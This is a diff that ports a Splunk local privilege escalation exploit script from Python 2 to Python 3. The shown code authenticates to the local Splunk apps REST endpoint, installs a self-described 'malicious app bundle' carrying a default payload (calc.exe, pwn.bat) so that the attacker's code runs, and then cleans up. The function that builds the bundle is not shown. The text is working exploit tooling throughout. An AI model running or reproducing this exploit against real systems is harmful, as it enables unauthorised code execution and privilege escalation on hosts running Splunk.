@@ -49,7 +49,7 @@ parser.add_argument('--payload', default="calc.exe")
 parser.add_argument('--payload-file', default="pwn.bat")
 options = parser.parse_args()
 
-print "Running in local mode (Local Privilege Escalation)"
+print ("Running in local mode (Local Privilege Escalation)")
 options.host = "127.0.0.1"
 
 SPLUNK_BASE_API = "{}://{}:{}/services/apps/local/".format(options.scheme, options.host, options.port, )
@@ -58,41 +58,41 @@ s = requests.Session()
 s.auth = requests.auth.HTTPBasicAuth(options.username, options.password)
 s.verify = False
 
-print "[.] Authenticating..."
+print ("[.] Authenticating...")
 req = s.get(SPLUNK_BASE_API)
 if req.status_code == 401:
-    print "Authentication failure"
-    print ""
-    print req.text
+    print ("Authentication failure")
+    print ("")
+    print (req.text)
     sys.exit(-1)
-print "[+] Authenticated"
+print ("[+] Authenticated")
 
-print "[.] Creating malicious app bundle..."
+print ("[.] Creating malicious app bundle...")
 BUNDLE_FILE = create_splunk_bundle(options)
-print "[+] Created malicious app bundle in: " + BUNDLE_FILE
+print ("[+] Created malicious app bundle in: " + BUNDLE_FILE)
 
 lurl = BUNDLE_FILE
 
-print "[.] Installing app from: " + lurl
+print ("[.] Installing app from: " + lurl)
 req = s.post(SPLUNK_BASE_API, data={'name': lurl, 'filename': True, 'update': True})
 if req.status_code != 200 and req.status_code != 201:
-    print "Got a problem: " + str(req.status_code)
-    print ""
-    print req.text
-print "[+] App installed, your code should be running now!"
+    print ("Got a problem: " + str(req.status_code))
+    print ("")
+    print (req.text)
+print ("[+] App installed, your code should be running now!")
 
-print "\nPress RETURN to cleanup"
-raw_input()
+print ("\nPress RETURN to cleanup")
+input()
 os.remove(BUNDLE_FILE)
 
-print "[.] Removing app..."
+print ("[.] Removing app...")
 req = s.delete(SPLUNK_BASE_API + SPLUNK_APP_NAME)
 if req.status_code != 200 and req.status_code != 201:
-    print "Got a problem: " + str(req.status_code)
-    print ""
-    print req.text
-print "[+] App removed"
+    print ("Got a problem: " + str(req.status_code))
+    print ("")
+    print (req.text)
+print ("[+] App removed")
 
-print "\nPress RETURN to exit"
-raw_input()
-print "Bye!"
+print ("\nPress RETURN to exit")
+input()
+print ("Bye!")
